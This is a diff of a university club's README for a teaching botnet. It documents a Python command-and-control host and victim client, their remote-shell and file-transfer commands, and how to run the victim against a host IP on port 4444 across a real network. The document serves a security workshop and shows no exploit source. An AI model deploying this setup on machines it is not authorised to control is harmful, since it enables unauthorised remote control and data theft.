@@ -7,13 +7,13 @@ Layer Zero and the University of Nevada, Las Vegas are not responsible for irres
 
 **FUTURE LAYER ZERO OFFICERS AND DEV TEAM: PLEASE DO NOT EDIT THE BASIC BOTNET FOLDER THIS IS A PROJECT FOR THE BOTNET WORKSHOP**
 **TO MAKE ADDITIONS TO THE PROJECT PLEASE MAKE A COPY IN A NEW FOLDER TO WORK IN!**
+---
+
 
 ## Basic Botnet
-
 This is a simple command and control (C2) botnet demonstration consisting of two Python scripts:
 - **`host.py`** - The controller/command center that manages victim connections
 - **`victim.py`** - The client that connects to the host and executes commands
-
 ### Features
 - Remote command execution
 - File upload/download capabilities
@@ -21,11 +21,10 @@ This is a simple command and control (C2) botnet demonstration consisting of two
 - Color-coded terminal output
 - Interactive help menus
 - Beginner-friendly comments
-
 ---
 
-## How to Run (Same Device Testing)
 
+## How to Run (Same Device Testing)
 ### Prerequisites
 - Python 3.x installed on your system
 - Two terminal windows
@@ -72,11 +71,10 @@ You should see:
 ```
 
 The host terminal will show a connection message with the victim's details.
-
 ---
 
-## Using the Command Center
 
+## Using the Command Center
 ### Main Commands (at `*Center:` prompt)
 
 | Command | Description | Example |
@@ -191,8 +189,8 @@ Shell#: cat test.txt
 
 ---
 
-## Example Full Workflow
 
+## Example Full Workflow
 ```bash
 # Terminal 1 (Host)
 python3 host.py
@@ -225,59 +223,51 @@ Shell#: download botnet_test.txt
 Shell#: exit
 *Center: quit
 ```
-
 ---
 
+
 ## Testing Multiple Victims
-
 To test with multiple victims on the same machine:
-
 1. Start `host.py` in one terminal
 2. Start multiple instances of `victim.py` in separate terminals
 3. Use `targets` to see all connected victims
 4. Use `session <#>` to control each one individually
-
 ---
 
-## Network Configuration
 
+## Network Configuration
 ### Running on Same Device (Testing)
 - Host listens on: `0.0.0.0:4444`
 - Victim connects to: `127.0.0.1:4444`
-
 ### Running on Different Devices (Real Network)
 1. Find your host computer's IP address:
    ```bash
    ifconfig  # macOS/Linux
    ipconfig  # Windows
    ```
-2. Update `victim.py` line 184 to use your host's actual IP:
+2. Update `victim.py` to use your host's actual IP:
    ```python
    server('YOUR_HOST_IP', 4444)  # Instead of '127.0.0.1'
    ```
 3. Ensure port 4444 is open in your firewall
-
 ---
 
-## Troubleshooting
 
+## Troubleshooting
 ### "Can't assign requested address"
 - Make sure the host is binding to `0.0.0.0` (not a specific IP)
-
 ### "Connection refused"
 - Make sure the host is running BEFORE starting the victim
-- Check that port 4444 is not blocked by firewall
+- Check that port 4444 is not blocked by a firewall
 - Verify the IP address is correct
-
 ### Victim won't connect
 - Ensure both programs are using the same port (4444)
 - Check firewall settings
 - Verify network connectivity between machines
-
 ---
 
-## Further Considerations
 
+## Further Considerations
 ### Potential Improvements
 - Add encryption (TLS/SSL) for secure communication
 - Implement authentication to verify victim identity
@@ -285,20 +275,14 @@ To test with multiple victims on the same machine:
 - Implement more advanced command handling
 - Add logging and monitoring features
 - Create a GUI for easier control
-
-### Learning Resources
-- Study network programming and socket communication
-- Learn about cybersecurity and penetration testing
-- Understand operating system internals
-- Research malware analysis techniques
-- Explore ethical hacking practices
-
 ---
 
-## License
 
+## License
 See LICENSE file for details.
+---
+
 
 ## Credits
-
 Created by Layer Zero @ University of Nevada, Las Vegas
+---
